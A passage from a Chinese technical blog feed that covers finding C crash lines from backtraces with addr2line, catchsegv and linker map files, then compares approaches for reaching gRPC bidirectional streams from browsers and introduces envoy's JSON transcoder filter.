7fb657f2e000-7fb657f2f000 rw-p 00016000 08:12 1644549 /usr/lib/libgcc_s.so.1
7fb657f2f000-7fb657f30000 ---p 00000000 00:00 0
7fb657f30000-7fb658780000 rw-p 00000000 00:00 0
7fb658780000-7fb658781000 ---p 00000000 00:00 0
7fb658781000-7fb658fd1000 rw-p 00000000 00:00 0
7fb658fd1000-7fb658fd2000 ---p 00000000 00:00 0
7fb658fd2000-7fb659822000 rw-p 00000000 00:00 0
7fb659822000-7fb659823000 ---p 00000000 00:00 0
7fb659823000-7fb65a073000 rw-p 00000000 00:00 0
7fb65a073000-7fb65a074000 ---p 00000000 00:00 0
7fb65a074000-7fb65a8c4000 rw-p 00000000 00:00 0
7fb65a8c4000-7fb65a8c5000 ---p 00000000 00:00 0
7fb65a8c5000-7fb65b115000 rw-p 00000000 00:00 0
7fb65b115000-7fb65b116000 ---p 00000000 00:00 0
7fb65b116000-7fb65b966000 rw-p 00000000 00:00 0
7fb65b966000-7fb65b967000 ---p 00000000 00:00 0
7fb65b967000-7fb65c1b7000 rw-p 00000000 00:00 0
7fb65c1b7000-7fb65c1b8000 ---p 00000000 00:00 0
7fb65c1b8000-7fb65ca08000 rw-p 00000000 00:00 0
7fb65ca08000-7fb65ca09000 ---p 00000000 00:00 0
7fb65ca09000-7fb65d259000 rw-p 00000000 00:00 0
7fb65d259000-7fb65d407000 r-xp 00000000 08:12 1575097 /usr/lib/libc-2.26.so
7fb65d407000-7fb65d607000 ---p 001ae000 08:12 1575097 /usr/lib/libc-2.26.so
7fb65d607000-7fb65d60b000 r--p 001ae000 08:12 1575097 /usr/lib/libc-2.26.so
7fb65d60b000-7fb65d60d000 rw-p 001b2000 08:12 1575097 /usr/lib/libc-2.26.so
7fb65d60d000-7fb65d611000 rw-p 00000000 00:00 0
7fb65d611000-7fb65d62a000 r-xp 00000000 08:12 1575121 /usr/lib/libpthread-2.26.so
7fb65d62a000-7fb65d829000 ---p 00019000 08:12 1575121 /usr/lib/libpthread-2.26.so
7fb65d829000-7fb65d82a000 r--p 00018000 08:12 1575121 /usr/lib/libpthread-2.26.so
7fb65d82a000-7fb65d82b000 rw-p 00019000 08:12 1575121 /usr/lib/libpthread-2.26.so
7fb65d82b000-7fb65d82f000 rw-p 00000000 00:00 0
7fb65d82f000-7fb65d97a000 r-xp 00000000 08:12 1575030 /usr/lib/libm-2.26.so
7fb65d97a000-7fb65db79000 ---p 0014b000 08:12 1575030 /usr/lib/libm-2.26.so
7fb65db79000-7fb65db7a000 r--p 0014a000 08:12 1575030 /usr/lib/libm-2.26.so
7fb65db7a000-7fb65db7b000 rw-p 0014b000 08:12 1575030 /usr/lib/libm-2.26.so
7fb65db7b000-7fb65db7f000 r-xp 00000000 08:12 1574894 /usr/lib/libSegFault.so
7fb65db7f000-7fb65dd7e000 ---p 00004000 08:12 1574894 /usr/lib/libSegFault.so
7fb65dd7e000-7fb65dd7f000 r--p 00003000 08:12 1574894 /usr/lib/libSegFault.so
7fb65dd7f000-7fb65dd80000 rw-p 00004000 08:12 1574894 /usr/lib/libSegFault.so
7fb65dd80000-7fb65dda5000 r-xp 00000000 08:12 1575098 /usr/lib/ld-2.26.so
7fb65df5a000-7fb65df5c000 rw-p 00000000 00:00 0
7fb65dfa2000-7fb65dfa4000 rw-p 00000000 00:00 0
7fb65dfa4000-7fb65dfa5000 r--p 00024000 08:12 1575098 /usr/lib/ld-2.26.so
7fb65dfa5000-7fb65dfa6000 rw-p 00025000 08:12 1575098 /usr/lib/ld-2.26.so
7fb65dfa6000-7fb65dfa7000 rw-p 00000000 00:00 0
7ffdc4b3a000-7ffdc4b5b000 rw-p 00000000 00:00 0 [stack]
7ffdc4bc8000-7ffdc4bcb000 r--p 00000000 00:00 0 [vvar]
7ffdc4bcb000-7ffdc4bcd000 r-xp 00000000 00:00 0 [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
</pre>

<p>
使用 <code>addr2line</code> 显示崩溃调用栈的源代码行
</p>
<pre class="example">
$ grep -E '^Backtrace:$' -A 10 app.log | grep -E '^\./app' | sed -r ':a;s/.\/app\(\+0x(.*)\)\[.*/\1/;ta;' | xargs addr2line -e ./app_debug
/home/tangxinfa/Examples/c/addr2line_demo/app.c:12
/home/tangxinfa/Examples/c/addr2line_demo/app.c:26
/home/tangxinfa/Examples/c/addr2line_demo/app.c:44
</pre>
<p>
需要注意的是 <code>addr2line</code> 需要依赖未 strip 调试符号的可执行程序版本，适合在调试
环境进行。
</p>

<p>
可以看到显示了调用栈对应的源代码行，但是除了崩溃的位置给出了正确的代码行
<code>app.c:12</code> ，其它两处给出的代码行指向了函数定义的尾扩号，如果一个函数有在多
个地方调用另一函数，则无法区分具体是哪个地方的调用引起了崩溃。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org7cdd3bb" class="outline-2">
<h2 id="org7cdd3bb">使用 MAP 文件</h2>
<div class="outline-text-2" id="text-org7cdd3bb">
<p>
一开始有调研过使用 Map 文件，试验失败，看了一下 Map 文件的内容，其中记载了函
数的地址，但没有详细的代码行地址，理论上是实现不了从崩溃地址获取源代码行地址
的目标的，所以开始研究其它方案。
</p>

<p>
后来一直在查资料，通过阅读《<a href="http://www.cchsu.com/arthur/prg_bg5/map_debug.htm">使用 MAP file 除錯的技巧</a>》一文，发现是之前姿势不对。
</p>

<blockquote>
<p>
MAP file 是 linker 将 object files 编译成 binary (EXE, DLL, &#x2026;) 时所产生的对
应表，亦即系统的 linker loader 如何载入这个 binary image 的报表。有了这个 map
文件，再加上 compiler 产生的 assembly source code，就成为找程序崩溃的最佳利器。
</p>
</blockquote>
<p>
引用自 <a href="http://www.cchsu.com/arthur/prg_bg5/map_debug.htm">使用 MAP file 除錯的技巧</a>。
</p>

<p>
这个方案需要在编译 <code>.obj</code> 文件时顺带输出 <code>.cod</code> ，在编译可执行程序时输出
<code>.map</code> 文件，获取到崩溃的地址后，查阅 <code>.map</code> 文件确定崩溃的函数，再根据崩溃地
址减去 <code>.map</code> 文件记录的函数地址算出偏移量，再根据偏移量从 <code>.cod</code> 文件中找到
代码行。
</p>

<ul class="org-ul">
<li><p>
编译过程中生成 <code>.cod</code> 和 <code>.map</code> 文件
</p>

<div class="org-src-container">
<pre class="src src-sh">gcc -c -g -Wa,-a,-ad app.c &gt; app.cod
gcc -g3 app.o -lpthread -Wl,-Map,app.map -o app
strip app
</pre>
</div></li>

<li><p>
使用 <code>libSegFault.so</code> 输出崩溃调用栈
</p>

<pre class="example">
$ catchsegv ./app &gt; ./app.log
$ cat ./app.log
*** Segmentation fault
Register dump:

 RAX: ffffffffffffffff   RBX: 0000000000000000   RCX: 0000000000000000
 RDX: 00007f6058689910   RSI: 0000000000000000   RDI: 00007f6058689910
 RBP: 00007f6058689e90   R8 : 0000000000000001   R9 : 0000000000000000
 R10: 0000000000000000   R11: 0000000000000000   R12: 00007ffdff6a66ae
 R13: 00007ffdff6a66af   R14: 00007f605868a700   R15: 0000000000000000
 RSP: 00007f6058689e70

 RIP: 00005641ac5ac917   EFLAGS: 00010202

 CS: 0033   FS: 0000   GS: 0000

 Trap: 0000000e   Error: 00000005   OldMask: 00000000   CR2: ffffffff

 FPUCW: 0000037f   FPUSW: 00000000   TAG: 00000000
 RIP: 00000000   RDP: 00000000

 ST(0) 0000 0000000000000000   ST(1) 0000 0000000000000000
 ST(2) 0000 0000000000000000   ST(3) 0000 0000000000000000
 ST(4) 0000 0000000000000000   ST(5) 0000 0000000000000000
 ST(6) 0000 0000000000000000   ST(7) 0000 0000000000000000
 mxcsr: 1f80
 XMM0:  00000000000000000000000025252525 XMM1:  00000000000000000000000025252525
 XMM2:  00000000000000000000000025252525 XMM3:  00000000000000000000000025252525
 XMM4:  00000000000000000000000025252525 XMM5:  00000000000000000000000025252525
 XMM6:  00000000000000000000000025252525 XMM7:  00000000000000000000000025252525
 XMM8:  00000000000000000000000025252525 XMM9:  00000000000000000000000025252525
 XMM10: 00000000000000000000000025252525 XMM11: 00000000000000000000000025252525
 XMM12: 00000000000000000000000025252525 XMM13: 00000000000000000000000025252525
 XMM14: 00000000000000000000000025252525 XMM15: 00000000000000000000000025252525

Backtrace:
./app(+0x917)[0x5641ac5ac917]
./app(+0x998)[0x5641ac5ac998]
./app(+0xa07)[0x5641ac5aca07]
./app(+0xa45)[0x5641ac5aca45]
/usr/lib/libpthread.so.0(+0x708a)[0x7f605a33d08a]
/usr/lib/libc.so.6(clone+0x3f)[0x7f605a07447f]

Memory map:

5641ac5ac000-5641ac5ad000 r-xp 00000000 08:02 42863218 /home/tangxinfa/Examples/c/addr2line_demo/app
5641ac7ad000-5641ac7ae000 r--p 00001000 08:02 42863218 /home/tangxinfa/Examples/c/addr2line_demo/app
5641ac7ae000-5641ac7af000 rw-p 00002000 08:02 42863218 /home/tangxinfa/Examples/c/addr2line_demo/app
5641aca9a000-5641acabb000 rw-p 00000000 00:00 0 [heap]
7f6048000000-7f6048021000 rw-p 00000000 00:00 0
7f6048021000-7f604c000000 ---p 00000000 00:00 0
7f6050000000-7f6050021000 rw-p 00000000 00:00 0
7f6050021000-7f6054000000 ---p 00000000 00:00 0
7f6054a3d000-7f6054a53000 r-xp 00000000 08:12 1644549 /usr/lib/libgcc_s.so.1
7f6054a53000-7f6054c52000 ---p 00016000 08:12 1644549 /usr/lib/libgcc_s.so.1
7f6054c52000-7f6054c53000 r--p 00015000 08:12 1644549 /usr/lib/libgcc_s.so.1
7f6054c53000-7f6054c54000 rw-p 00016000 08:12 1644549 /usr/lib/libgcc_s.so.1
7f6054c54000-7f6054c55000 ---p 00000000 00:00 0
7f6054c55000-7f60554a5000 rw-p 00000000 00:00 0
7f60554a5000-7f60554a6000 ---p 00000000 00:00 0
7f60554a6000-7f6055cf6000 rw-p 00000000 00:00 0
7f6055cf6000-7f6055cf7000 ---p 00000000 00:00 0
7f6055cf7000-7f6056547000 rw-p 00000000 00:00 0
7f6056547000-7f6056548000 ---p 00000000 00:00 0
7f6056548000-7f6056d98000 rw-p 00000000 00:00 0
7f6056d98000-7f6056d99000 ---p 00000000 00:00 0
7f6056d99000-7f60575e9000 rw-p 00000000 00:00 0
7f60575e9000-7f60575ea000 ---p 00000000 00:00 0
7f60575ea000-7f6057e3a000 rw-p 00000000 00:00 0
7f6057e3a000-7f6057e3b000 ---p 00000000 00:00 0
7f6057e3b000-7f605868b000 rw-p 00000000 00:00 0
7f605868b000-7f605868c000 ---p 00000000 00:00 0
7f605868c000-7f6058edc000 rw-p 00000000 00:00 0
7f6058edc000-7f6058edd000 ---p 00000000 00:00 0
7f6058edd000-7f605972d000 rw-p 00000000 00:00 0
7f605972d000-7f605972e000 ---p 00000000 00:00 0
7f605972e000-7f6059f7e000 rw-p 00000000 00:00 0
7f6059f7e000-7f605a12c000 r-xp 00000000 08:12 1575097 /usr/lib/libc-2.26.so
7f605a12c000-7f605a32c000 ---p 001ae000 08:12 1575097 /usr/lib/libc-2.26.so
7f605a32c000-7f605a330000 r--p 001ae000 08:12 1575097 /usr/lib/libc-2.26.so
7f605a330000-7f605a332000 rw-p 001b2000 08:12 1575097 /usr/lib/libc-2.26.so
7f605a332000-7f605a336000 rw-p 00000000 00:00 0
7f605a336000-7f605a34f000 r-xp 00000000 08:12 1575121 /usr/lib/libpthread-2.26.so
7f605a34f000-7f605a54e000 ---p 00019000 08:12 1575121 /usr/lib/libpthread-2.26.so
7f605a54e000-7f605a54f000 r--p 00018000 08:12 1575121 /usr/lib/libpthread-2.26.so
7f605a54f000-7f605a550000 rw-p 00019000 08:12 1575121 /usr/lib/libpthread-2.26.so
7f605a550000-7f605a554000 rw-p 00000000 00:00 0
7f605a554000-7f605a558000 r-xp 00000000 08:12 1574894 /usr/lib/libSegFault.so
7f605a558000-7f605a757000 ---p 00004000 08:12 1574894 /usr/lib/libSegFault.so
7f605a757000-7f605a758000 r--p 00003000 08:12 1574894 /usr/lib/libSegFault.so
7f605a758000-7f605a759000 rw-p 00004000 08:12 1574894 /usr/lib/libSegFault.so
7f605a759000-7f605a77e000 r-xp 00000000 08:12 1575098 /usr/lib/ld-2.26.so
7f605a932000-7f605a935000 rw-p 00000000 00:00 0
7f605a97b000-7f605a97d000 rw-p 00000000 00:00 0
7f605a97d000-7f605a97e000 r--p 00024000 08:12 1575098 /usr/lib/ld-2.26.so
7f605a97e000-7f605a97f000 rw-p 00025000 08:12 1575098 /usr/lib/ld-2.26.so
7f605a97f000-7f605a980000 rw-p 00000000 00:00 0
7ffdff688000-7ffdff6a9000 rw-p 00000000 00:00 0 [stack]
7ffdff75b000-7ffdff75e000 r--p 00000000 00:00 0 [vvar]
7ffdff75e000-7ffdff760000 r-xp 00000000 00:00 0 [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
</pre></li>

<li><p>
定位源代码行
</p>

<p>
在 <code>app.map</code> 文件中找到第一个地址小于等于 <code>0x917</code> 的函数是 <code>bug</code>
</p>
<pre class="example">
0x00000000000008ea                bug
</pre>

<p>
计算偏移量
</p>
<pre class="example">
0x917 - 0x8ea = 0x2d
</pre>

<p>
在 <code>bug</code> 函数对应的 <code>.cod</code> 文件 <code>app.cod</code> 中查找这个偏移量
</p>
<pre class="example">
12:app.c         ****   printf("%d\n", *p);
32                    .loc 1 12 0
33 0029 488B45F8      movq    -8(%rbp), %rax
34 002d 8B00          movl    (%rax), %eax
</pre>

<p>
找到了正确的崩溃代码行 <code>app.c</code> 第 <code>12</code> 行 <code>printf("%d\n", *p);</code> 。
</p>

<p>
接着继续找一下地址 <code>0x998</code> ，从 <code>.map</code> 找出的对应函数为 <code>func_b</code> ，计算出的偏
移地址为 <code>0x62</code> 对应的源代码行 <code>app.c</code> 第 <code>21</code> 行 <code>printf("[%d] This is
  func_b\n", id)</code> ，找到了错误的代码行。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgf08f5ac" class="outline-2">
<h2 id="orgf08f5ac">总结</h2>
<div class="outline-text-2" id="text-orgf08f5ac">
<p>
三种方案都可以获得同样的结果。
</p>

<p>
使用 <code>gdb</code> 从 core 文件获取崩溃调用栈的方案依赖 core 文件。但如果要实现接管操
作系统级的 core dump 处理，然后统一上报则会成为自然的选择，这个方案会非常通用。
生产环境需要开启 core dump 以及安装 <code>gdb</code> 。
需要预先保管好调试信息或未 strip 调试信息的可执行程序。
</p>

<p>
使用 <code>libSegFault.so</code> 输出崩溃调用栈的方案不依赖 core 文件，更轻量级。但是需
要在运行程序时提前以 <code>LD_PRELOAD</code> 环境变量注入 <code>libSegFault.so</code> 。
需要预先保管好未 strip 调试信息的可执行程序。
</p>

<p>
使用 Map 文件需要使用前面两种方案一样的方法来获取崩溃的调用栈，只是定位源代码
行时不依赖可执行程序。需要进行的手工查找、计算，暂时没有找到简化操作的工具。
需要预先保管好 <code>.cod</code> 以及 <code>.map</code> 文件。
</p>
</div>
</div>

<div id="outline-container-org0261c41" class="outline-2">
<h2 id="org0261c41">参考</h2>
<div class="outline-text-2" id="text-org0261c41">
<ul class="org-ul">
<li><a href="https://stackoverflow.com/questions/7556045/how-to-map-function-address-to-function-in-so-files">c - How to map function address to function in *.so files - Stack Overflow</a></li>

<li><a href="http://blog.cuicc.com/blog/2012/09/17/core-dump-and-backtrace/">Core dump与backtrace｜YYGCui's blog</a></li>

<li><a href="https://fedoraproject.org/wiki/StackTraces#Obtaining_a_stack_trace_from_a_core_dump">StackTraces - FedoraProject</a></li>

<li><a href="https://www.quora.com/Does-addr2line-work-in-Linux">Does addr2line work in Linux? - Quora</a></li>

<li><a href="http://awhite2008.blog.sohu.com/155610926.html">使用libSegFault.so拦截段错误信号-泛舟-搜狐博客</a></li>

<li><a href="https://stackoverflow.com/questions/18706496/can-one-use-libsegfault-so-to-get-backtraces-for-sigabrt">stack trace - Can one use libSegFault.so to get backtraces for SIGABRT? - Stack Overflow</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在浏览器中访问 gRPC 消息推送服务的一些思索]]></title>
            <link>/article/57286d4f89c856684e2d8bbf95ee-grpc-6d88606f63a89001670d52a176844e004e9b601d7d22.html</link>
            <guid>/article/57286d4f89c856684e2d8bbf95ee-grpc-6d88606f63a89001670d52a176844e004e9b601d7d22.html</guid>
            <pubDate>Thu, 26 Oct 2017 09:13:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
gRPC 数据编码采用 Protobuf、底层传输协议使用了 HTTP/2，支持双向流（ <code>Bidirectional streaming</code> ）接口，用来开发消息推送服务的再完美不过。
</p>

<p>
由于 gRPC 的实现需要访问 HTTP/2 的底层细节（如： Trailers），而这些实现细节浏览器上是无法访问到的，因此也就注定了无法在浏览器上直接进行调用 gRPC。
</p>

<p>
HTTP/2 在 2015 年底开始被广泛支持（参考 <a href="https://zh.wikipedia.org/wiki/HTTP/2">HTTP/2 - 维基百科，自由的百科全书</a>），另一个流行的消息推送技术 WebSocket 在 2013 年底开始被广泛支持（参考 <a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API#Browser_compatibility">WebSockets - Web APIs | MDN</a>）。从 <a href="http://caniuse.com/#search=HTTP2">HTTP/2支持情况</a> 页面可以看到 IE11 以下都不支持，从 <a href="http://caniuse.com/#search=WebSocket">WebSocket支持情况</a> 页面可以看到 IE11 以下及 Android 4.4 以下都不支持。相对来讲 WebSocket 更成熟，而且由于 <a href="https://socket.io/">socket.io</a> 的存在，即使在旧浏览器上也能提供服务。
</p>

<p>
现在的情况下，最好是开发一个 <a href="https://socket.io/">socket.io</a> 代理供浏览器访问 gRPC 服务，一个 WebSocket 连接可以很方便地映射到一个 gRPC 双向流（ Bidirectional streaming）接口。
</p>


<p>
下面是方案调研时接触的一些相关开源项目，供参考。
</p>

<div id="outline-container-orgd66af56" class="outline-2">
<h2 id="orgd66af56"><a href="https://github.com/grpc-ecosystem/grpc-gateway">grpc-gateway</a></h2>
<div class="outline-text-2" id="text-orgd66af56">
<blockquote>
<p>
grpc-gateway is a plugin of protoc. It reads gRPC service definition, and generates a reverse-proxy server which translates a RESTful JSON API into gRPC. This server is generated according to custom options in your gRPC definition.
</p>
</blockquote>

<p>
grpc-gateway 为 Grpc 服务生成 HTTP/1.1 JSON RESTful 反向代理服务，使得 Grpc 服务可以被不方便采用 Grpc 的客户端访问。
</p>

<ul class="org-ul">
<li><p>
存在的问题
</p>

<p>
不支持双向流（Bidirectional streaming）
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org807a12a" class="outline-2">
<h2 id="org807a12a"><a href="https://github.com/tmc/grpc-websocket-proxy">grpc-websocket-proxy</a></h2>
<div class="outline-text-2" id="text-org807a12a">
<blockquote>
<p>
A proxy to transparently upgrade grpc-gateway streaming endpoints to use websockets
</p>
</blockquote>

<p>
<a href="https://github.com/grpc-ecosystem/grpc-gateway">grpc-gateway</a> 的 WebSocket 代理，进行了多次协议转换：
</p>

<pre class="example">
WebSocket &lt;-&gt; HTTP/1.1 &lt;-&gt; gRPC
</pre>

<p>
在收到 WebSocket 连接后，会创建一个 HTTP/1.1 客户端，与 <a href="https://github.com/grpc-ecosystem/grpc-gateway">grpc-gateway</a> 进行对接。
</p>

<p>
根据示例 Protobuf 协议文件中的描述，貌似支持 <code>Bidirectional streaming</code> ，但是 <a href="https://github.com/grpc-ecosystem/grpc-gateway">grpc-gateway</a> 的 README 中明确声明了不打算支持 <code>True bi-directional streaming</code> ，理论上只要是基于 HTTP/1.1，就不可能实现  <code>Bidirectional streaming</code> 。
</p>

<p>
这个方案的一个优点就是 proxy 代码是根据 proto 定义自动生成的，开发效率超高。
</p>

<p>
然而运行效率低下，特别是维护大量长连接的消息推送应用，连接数要翻倍。
</p>
</div>
</div>

<div id="outline-container-org1271514" class="outline-2">
<h2 id="org1271514"><a href="https://socket.io/">socket.io</a></h2>
<div class="outline-text-2" id="text-org1271514">
<blockquote>
<p>
Socket.IO enables real-time bidirectional event-based communication.
It works on every platform, browser or device, focusing equally on reliability and speed. 
</p>
</blockquote>

<p>
<code>node.js</code> 下的实时双向通讯方案，优先使用 <code>websocket</code> 做为传输层，使用其它传输方式做为备选：ajax、jsonp 轮询，flash。
</p>

<p>
<a href="https://socket.io/">socket.io</a> 本身已经进化成了一种规范，有各种语言下的实现。
</p>

<p>
go 语言实现 <a href="https://github.com/googollee/go-socket.io">go-socket.io</a> ，这个项目 README 中建议使用 v1.4 版本，实际使用时发现浏览器直接关闭时服务器未能检测客户端离线，未转化成 "Disconnect" 事件，使用 master 分支则没有这个问题：
</p>

<div class="org-src-container">
<pre class="src src-sh">go get github.com/googollee/go-socket.io
</pre>
</div>

<p>
go 的 socket.io 实现没有官方支持，很不完善，<a href="https://github.com/googollee/go-socket.io">go-socket.io</a> 只有服务器端实现，已
经很久没有更新了，而 go 的 socket.io 客户端实现就更不靠谱了，实际使用时很多问
题，直接使用 websocket 会更靠谱一些。
</p>
</div>
</div>

<div id="outline-container-org3324199" class="outline-2">
<h2 id="org3324199"><a href="https://lyft.github.io/envoy/">envoy</a></h2>
<div class="outline-text-2" id="text-org3324199">
<p>
<a href="https://lyft.github.io/envoy/">envoy</a> 有一些插件完成了部分功能：
</p>

<ul class="org-ul">
<li><p>
<a href="https://envoyproxy.github.io/envoy/configuration/http_filters/grpc_http1_bridge_filter.html">gRPC HTTP/1.1 bridge</a>
</p>

<p>
实现了通过 HTTP/1.1 协议调用 gRPC（HTTP/2） 的功能。
</p>

<p>
采用和 gRPC 一致的数据编码方式（Protobuf 二进制数据），只支持 <code>unary gRPC API</code> 。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
<a href="https://envoyproxy.github.io/envoy/configuration/http_filters/grpc_json_transcoder_filter.html">gRPC-JSON transcoder filter</a>
</p>

<p>
支持 gRPC 的 <code>Server streaming</code> 和 <code>Client streaming</code> ，Envoy 将流式请求及响应缓存起来了，所以实时性较差；不支持 <code>Bidirectional streaming</code> 。
</p>

<p>
由于客户端是通过 HTTP/1.1 进行访问，所以不支持真正的 streaming。
</p>

<p>
详见 <a href="http://blog.kankanan.com/article/envoy-7684-json_transcoder_filter-4ecb7ecd.html">Envoy 的 json_transcoder_filter 介绍</a>
</p>

<p>
要在 Envoy 中实现 Websocket 访问 gRPC 可以参考 <a href="https://envoyproxy.github.io/envoy/configuration/http_filters/grpc_json_transcoder_filter.html">gRPC-JSON transcoder filter</a> 。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
<a href="https://envoyproxy.github.io/envoy/configuration/http_filters/grpc_web_filter.html">gRPC-Web filter</a>
</p>

<p>
基于 <a href="https://github.com/grpc/grpc/blob/master/doc/PROTOCOL-WEB.md">gRPC Web</a> 协议的实现，跟原始的 gRPC 协议基本一致，通过去除对 HTTP/2 底层（如 frame）的依赖，使得在浏览器上调用 gRPC 成为可能。
</p>

<p>
当前不支持 <code>Bidirectional Streaming</code> ，以后在最新的浏览器中可能支持。
</p></li>
</ul>


<ul class="org-ul">
<li><p>
<a href="https://envoyproxy.github.io/envoy/intro/arch_overview/websocket.html?highlight=websocket">WebSocket support</a>
</p>

<p>
支持接入 WebSocket，会建立一条到 Upstream 的 TCP 连接，Upstream 服务需要是一个完整的 WebSocket 服务器，
相当于是一个 WebSocket 的透明代理。
</p>

<p>
由于客户端发起的 WebSocket 连接与到 Upstream 的连接（TCP）是 <code>1:1</code> 的关系，可扩展性较差。
</p></li>
</ul>


<p>
Envoy 中编写插件支持 WebSocket 到 gRPC 的协议转换（支持 <code>Bidirectional streaming</code> ）理论上是可以实现的，不过难度会比较高，需要对 Envoy 的实现非常了解。初步看了一下 envoy 的相关代码，表面上代码层次分明，但是实际上却是错综复杂，大量使用继承，上下层会互相调用，由于大量采用回调函数，逻辑不好理解。
</p>
</div>
</div>


<div id="outline-container-org767f531" class="outline-2">
<h2 id="org767f531">nginx</h2>
<div class="outline-text-2" id="text-org767f531">
<p>
与 envoy 的 <a href="https://envoyproxy.github.io/envoy/intro/arch_overview/websocket.html?highlight=websocket">WebSocket support</a> 相似，支持接入 WebSocket，会建立一条到 Upstream 的 TCP 连接，Upstream 服务需要是一个完整的 WebSocket 服务器，相当于是一个 WebSocket 的透明代理，由于客户端发起的 WebSocket 连接与到 Upstream 的连接（通过 proxy_pass 指令）是 <code>1:1</code> 的关系，连接数倍增，参考 <a href="https://www.nginx.com/blog/http2-module-nginx/#QandAnginx">https://www.nginx.com/blog/http2-module-nginx/#QandAnginx</a> 。
</p>

<ul class="org-ul">
<li><p>
<a href="https://github.com/slact/nchan">Nchan</a>
</p>

<blockquote>
<p>
Fast, horizontally scalable, multiprocess pub/sub queuing server and proxy for HTTP, long-polling, Websockets and EventSource (SSE), powered by Nginx.
</p>
</blockquote>

<p>
是 Nginx 的一个插件，支持各种接入方式，是搭建消息推送系统的一种很好的选择。
通过回调（HTTP/1.1 Restful）与业务系统集成在一起，使得业务系统不需要关心客户端接入细节。</p></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Envoy 的 json_transcoder_filter 介绍]]></title>
            <link>/article/envoy-7684-json_transcoder_filter-4ecb7ecd.html</link>
            <guid>/article/envoy-7684-json_transcoder_filter-4ecb7ecd.html</guid>
            <pubDate>Thu, 12 Oct 2017 11:56:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
json_transcoder_filter 实现 HTTP/1.1+JSON 与 HTTP/2+GRPC 的互转。
</p>

<p>
使用第三方库 <a href="https://github.com/grpc-ecosystem/grpc-httpjson-transcoding">grpc-httpjson-transcoding</a> 完成 json 与 grpc 的协议转换，
转换规则由 <a href="https://github.com/googleapis/googleapis/blob/master/google/api/http.proto">http.proto</a> 定义。
</p>

<p>
<a href="https://github.com/googleapis/googleapis/blob/master/google/api/http.proto">http.proto</a> 通过注解（Annotations）为 GRPC 接口添加 RESTful HTTP 接口映射。
</p>

<p>
<code>json_transcoder_filter</code> 对 stream 有一定支持，由于它是基于 HTTP/1.1，本质上是请求-响应模型，
只支持 GRPC 的 <code>Server streaming</code> 和 <code>Client streaming</code> ，不支持 <code>Bidirectional streaming</code> ，
它将 GRPC 消息流映射为消息数组（Json array）。
</p>

<div id="outline-container-orgab32387" class="outline-2">
<h2 id="orgab32387">示例项目</h2>
<div class="outline-text-2" id="text-orgab32387">
<p>
Envoy 带了一个 <a href="https://github.com/envoyproxy/envoy/tree/master/examples/grpc-bridge">grpc-bridge 示例项目</a>，依照它做了一个 grpc_json_transcoder 示例项目：
</p>

<ul class="org-ul">
<li><a href="https://github.com/tangxinfa/grpc_json_transcoder_example">tangxinfa/grpc_json_transcoder_example: Envoy grpc_json_transcoder filter example</a></li>
</ul>
</div>
</div>

<div id="outline-container-org2f92100" class="outline-2">
<h2 id="org2f92100">参考</h2>
<div class="outline-text-2" id="text-org2f92100">
<ul class="org-ul">
<li><a href="https://cloud.google.com/endpoints/docs/grpc/transcoding">Transcoding HTTP/JSON to gRPC  |  Cloud Endpoints with gRPC  |  Google Cloud Platform</a></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Protobuf 与 Json 数据格式转换]]></title>
            <link>/article/protobuf-4e0e-json-6570636e683c5f0f8f6c6362.html</link>
            <guid>/article/protobuf-4e0e-json-6570636e683c5f0f8f6c6362.html</guid>
            <pubDate>Fri, 29 Sep 2017 03:57:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org19b61e4" class="outline-2">
<h2 id="org19b61e4">Protobuf 和 Json 存在显著的差异</h2>
<div class="outline-text-2" id="text-org19b61e4">
<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">数据格式</th>
<th scope="col" class="org-left">编码</th>
<th scope="col" class="org-left">自描述</th>
<th scope="col" class="org-left">字段顺序性</th>
<th scope="col" class="org-left">基本数据类型</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Protobuf</td>
<td class="org-left">二进制</td>
<td class="org-left">否</td>
<td class="org-left">是</td>
<td class="org-left">丰富</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">编码后的数据不包括字段名称，</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">double</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">字段以 proto 文件 tag 值标识</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">float</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">int32</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">int64</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">uint32</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">uint64</td>
</tr>

<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
<td class="org-left">sint32</td>
